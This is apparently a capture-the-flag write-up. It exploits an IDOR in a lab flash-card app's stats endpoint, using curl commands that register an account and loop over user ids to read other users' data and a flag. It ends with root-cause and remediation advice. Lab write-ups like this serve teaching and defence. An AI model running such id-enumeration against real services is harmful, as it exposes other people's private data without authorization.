# BugForge Daily CTF — Tanuki SRS Flash Cards (IDOR)

- **Target:** https://lab-1781454259903-y80bqr.labs-app.bugforge.io/login
- **App:** "Tanuki – Learn with spaced repetition flash cards" (React SPA + Express/JSON API)
- **Vulnerability class:** IDOR (Insecure Direct Object Reference) — Broken Object Level Authorization
- **Flag:** `bug{WPmBAR8uRBflk5JklMDGxYylqj4GNY1Q}`

---

## 1. Recon

The login page returns a React single-page app. The HTML references a JS bundle:

```
GET /login  ->  /static/js/main.3b4ae99e.js
```

Downloading and grepping the bundle for API routes revealed the backend surface:

```
/api/login            /api/register          /api/verify-token
/api/decks            /api/decks/            /api/decks/available
/api/study/           /api/study/progress    /api/study/session   /api/study/sessions
/api/stats/
/api/admin/users      /api/admin/decks       /api/admin/cards
```

Inspecting how the front end actually calls these endpoints (axios instance `Ro`):

```js
// Stats page
Ro.get("/api/stats/".concat(l.id));   // <-- user id taken from CLIENT-side object
```

The stats endpoint takes a **user ID supplied by the client** (`l.id`, the logged-in
user's own id from the decoded JWT). This is a textbook IDOR candidate — if the server
does not verify that the requested id matches the authenticated user, any user's stats
can be read.

## 2. Get an authenticated session

Registration requires `username`, `email`, and `password`:

```bash
curl -s -X POST "$B/api/register" -H "Content-Type: application/json" \
  -d '{"username":"pentest_anik","email":"anik@test.com","password":"Test12345!"}'
```

Response:

```json
{"token":"eyJ...","user":{"id":4,"username":"pentest_anik","email":"anik@test.com"}}
```

My account is **user id 4**. The JWT payload decodes to `{"id":4,"username":"pentest_anik"}`.

## 3. Confirm and exploit the IDOR

Calling the stats endpoint for my own id behaves normally. Calling it with **other
users' ids** (1, 2, 3, 5) returns their stats — and those responses contain an extra
`achievement_flag` field that is absent from my own:

```bash
T="<jwt for user 4>"
for i in 1 2 3 4 5; do
  echo "=== stats user $i ==="
  curl -s "$B/api/stats/$i" -H "Authorization: Bearer $T"
done
```

Output:

```json
// user 1
{"total_cards_studied":0,"cards_mastered":0,"total_reviews":null,
 "sessions_this_week":0,"cards_studied_this_week":0,
 "achievement_flag":"bug{WPmBAR8uRBflk5JklMDGxYylqj4GNY1Q}"}

// user 4 (me) — no flag
{"total_cards_studied":0,"cards_mastered":0,"total_reviews":null,
 "sessions_this_week":0,"cards_studied_this_week":0}
```

The server uses the `{userId}` path parameter directly to look up records and never
checks it against the authenticated identity in the JWT. Any authenticated user can read
any other user's stats simply by changing the number in the URL.

## 4. Flag

```
bug{WPmBAR8uRBflk5JklMDGxYylqj4GNY1Q}
```

---

## 5. Root cause & remediation

**Root cause:** `GET /api/stats/:userId` performs no object-level authorization. It trusts
the client-supplied id instead of the authenticated user id from the verified JWT.

**Fixes:**
- Derive the user id from the **server-verified JWT**, not from a path/query parameter:
  `GET /api/stats/me` using `req.user.id`.
- If an id must be accepted, enforce `req.params.userId === req.user.id` (or a proper
  role/ownership check) before returning data.
- Never return sensitive fields (like an `achievement_flag`) that the requester isn't
  authorized to see.
- Apply the same ownership checks to the other id-parameterized routes
  (`/api/decks/:id`, `/api/study/:id/cards`, etc.).
